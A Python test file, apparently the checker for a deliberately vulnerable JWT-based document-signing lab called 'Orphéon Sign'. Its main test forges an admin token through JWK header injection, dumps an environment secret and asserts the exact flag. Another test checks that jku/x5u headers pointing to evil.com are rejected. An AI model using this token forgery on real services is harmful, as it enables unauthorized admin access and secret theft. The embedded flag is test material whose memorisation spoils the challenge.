import pytest
import requests
import json
import base64
import time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from jose import jwt
from jose.utils import base64url_encode
from jose.backends import RSAKey
import os
import sys

# Add the build directory to the path to import the app
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'build'))

class TestOrpheonSign:
    def __init__(self):
        self.base_url = "http://localhost:3206"
        self.session = requests.Session()
        self.employee_token = None
        self.admin_token = None
        self.attacker_private_key = None
        self.attacker_public_key = None
        self.attacker_jwk = None
        
    def setup_method(self):
        """Setup test data and generate attacker keys"""
        # Generate attacker RSA key pair
        self.attacker_private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        self.attacker_public_key = self.attacker_private_key.public_key()
        
        # Convert public key to JWK format
        public_numbers = self.attacker_public_key.public_numbers()
        n = public_numbers.n
        e = public_numbers.e
        
        # Convert to base64url
        n_bytes = n.to_bytes((n.bit_length() + 7) // 8, 'big')
        e_bytes = e.to_bytes((e.bit_length() + 7) // 8, 'big')
        
        n_b64 = base64url_encode(n_bytes).decode('utf-8')
        e_b64 = base64url_encode(e_bytes).decode('utf-8')
        
        self.attacker_jwk = {
            "kty": "RSA",
            "n": n_b64,
            "e": e_b64,
            "kid": "attacker-key",
            "alg": "RS256",
            "use": "sig"
        }
        
        # Login as employee
        self.employee_token = self._login("john.doe@orpheon.com", "password123")
        
        # Login as admin
        self.admin_token = self._login("admin@orpheon.com", "admin123")
    
    def _login(self, email, password):
        """Login and return JWT token"""
        response = self.session.post(
            f"{self.base_url}/auth/api/login",
            json={"email": email, "password": password}
        )
        assert response.status_code == 200
        return response.json()["token"]
    
    def _create_malicious_token(self, role="admin"):
        """Create a malicious JWT token with JWK header injection"""
        now = int(time.time())
        
        # Create payload
        payload = {
            "sub": "attacker@evil.com",
            "role": role,
            "iat": now,
            "exp": now + 3600  # 1 hour
        }
        
        # Create header with JWK injection
        header = {
            "alg": "RS256",
            "typ": "JWT",
            "kid": "attacker-key",
            "jwk": self.attacker_jwk  # VULNERABILITY: JWK in header
        }
        
        # Convert private key to PEM format for jose
        private_key_pem = self.attacker_private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode('utf-8')
        
        # Sign the token with attacker's private key
        token = jwt.encode(payload, private_key_pem, algorithm="RS256", headers=header)
        return token
    
    def test_health_check(self):
        """Test that the application is running"""
        response = self.session.get(f"{self.base_url}/")
        assert response.status_code == 200
        assert "Orphéon Sign" in response.text
    
    def test_employee_cannot_access_admin(self):
        """Test that employee cannot access admin routes with normal token"""
        headers = {"Authorization": f"Bearer {self.employee_token}"}
        
        # Try to access admin dashboard
        response = self.session.get(f"{self.base_url}/admin", headers=headers)
        assert response.status_code == 403
        
        # Try to access admin integrations
        response = self.session.get(f"{self.base_url}/admin/integrations", headers=headers)
        assert response.status_code == 403
        
        # Try to access admin export
        response = self.session.get(f"{self.base_url}/admin/export/env", headers=headers)
        assert response.status_code == 403
    
    def test_admin_can_access_admin_routes(self):
        """Test that admin can access admin routes with legitimate token"""
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        
        # Access admin dashboard
        response = self.session.get(f"{self.base_url}/admin", headers=headers)
        assert response.status_code == 200
        
        # Access admin integrations
        response = self.session.get(f"{self.base_url}/admin/integrations", headers=headers)
        assert response.status_code == 200
        
        # Access admin export
        response = self.session.get(f"{self.base_url}/admin/export/env", headers=headers)
        assert response.status_code == 200
        assert "ORPHEON_WHSEC_LIVE=" in response.text
    
    def test_jwk_header_injection_bypass(self):
        """Test JWK header injection vulnerability - the main exploit"""
        # Create malicious token with JWK header injection
        malicious_token = self._create_malicious_token(role="admin")
        
        headers = {"Authorization": f"Bearer {malicious_token}"}
        
        # Try to access admin dashboard with malicious token
        response = self.session.get(f"{self.base_url}/admin", headers=headers)
        assert response.status_code == 200, "JWK header injection should allow admin access"
        
        # Try to access admin integrations
        response = self.session.get(f"{self.base_url}/admin/integrations", headers=headers)
        assert response.status_code == 200
        
        # Try to access admin export and get the secret
        response = self.session.get(f"{self.base_url}/admin/export/env", headers=headers)
        assert response.status_code == 200
        
        env_content = response.text
        assert "ORPHEON_WHSEC_LIVE=" in env_content
        assert "whsec_live_7e1c1c0b7b0b45cda0a9d0f2b6c2b0a9b3d4c8e7a1f2c3b4d5e6f7a8b9c0d1" in env_content
        
        print(f"\n🎯 VULNERABILITY EXPLOITED SUCCESSFULLY!")
        print(f"🔑 Secret retrieved: {env_content.strip()}")
    
    def test_jku_x5u_rejected(self):
        """Test that jku and x5u are properly rejected"""
        now = int(time.time())
        
        # Test jku rejection
        payload = {
            "sub": "attacker@evil.com",
            "role": "admin",
            "iat": now,
            "exp": now + 3600
        }
        
        header_with_jku = {
            "alg": "RS256",
            "typ": "JWT",
            "kid": "attacker-key",
            "jku": "https://evil.com/keys.json"  # Should be rejected
        }
        
        # Convert private key to PEM format for jose
        private_key_pem = self.attacker_private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode('utf-8')
        
        token_with_jku = jwt.encode(payload, private_key_pem, algorithm="RS256", headers=header_with_jku)
        headers = {"Authorization": f"Bearer {token_with_jku}"}
        
        response = self.session.get(f"{self.base_url}/admin", headers=headers)
        assert response.status_code == 401
        assert "jku and x5u are not allowed" in response.json()["error"]
        
        # Test x5u rejection
        header_with_x5u = {
            "alg": "RS256",
            "typ": "JWT",
            "kid": "attacker-key",
            "x5u": "https://evil.com/cert.pem"  # Should be rejected
        }
        
        token_with_x5u = jwt.encode(payload, private_key_pem, algorithm="RS256", headers=header_with_x5u)
        headers = {"Authorization": f"Bearer {token_with_x5u}"}
        
        response = self.session.get(f"{self.base_url}/admin", headers=headers)
        assert response.status_code == 401
        assert "jku and x5u are not allowed" in response.json()["error"]
    
    def test_documents_access(self):
        """Test that authenticated users can access documents"""
        headers = {"Authorization": f"Bearer {self.employee_token}"}
        
        response = self.session.get(f"{self.base_url}/documents", headers=headers)
        assert response.status_code == 200
        assert "Document Management" in response.text
    
    def test_login_functionality(self):
        """Test login functionality"""
        # Test valid login
        response = self.session.post(
            f"{self.base_url}/auth/api/login",
            json={"email": "john.doe@orpheon.com", "password": "password123"}
        )
        assert response.status_code == 200
        assert "token" in response.json()
        
        # Test invalid login
        response = self.session.post(
            f"{self.base_url}/auth/api/login",
            json={"email": "john.doe@orpheon.com", "password": "wrongpassword"}
        )
        assert response.status_code == 401

def test_main():
    """Main test function that runs all tests"""
    test_instance = TestOrpheonSign()
    
    print("🧪 Starting Orphéon Sign Security Tests...")
    print("=" * 50)
    
    try:
        # Setup
        test_instance.setup_method()
        print("✅ Test setup completed")
        
        # Run tests
        test_instance.test_health_check()
        print("✅ Health check passed")
        
        test_instance.test_employee_cannot_access_admin()
        print("✅ Employee access restriction verified")
        
        test_instance.test_admin_can_access_admin_routes()
        print("✅ Admin access verified")
        
        test_instance.test_jwk_header_injection_bypass()
        print("✅ JWK header injection vulnerability confirmed")
        
        test_instance.test_jku_x5u_rejected()
        print("✅ jku/x5u rejection verified")
        
        test_instance.test_documents_access()
        print("✅ Documents access verified")
        
        test_instance.test_login_functionality()
        print("✅ Login functionality verified")
        
        print("=" * 50)
        print("🎉 ALL TESTS PASSED!")
        print("🔓 Vulnerability successfully exploited via JWK header injection")
        
    except Exception as e:
        print(f"❌ Test failed: {e}")
        raise

if __name__ == "__main__":
    test_main()
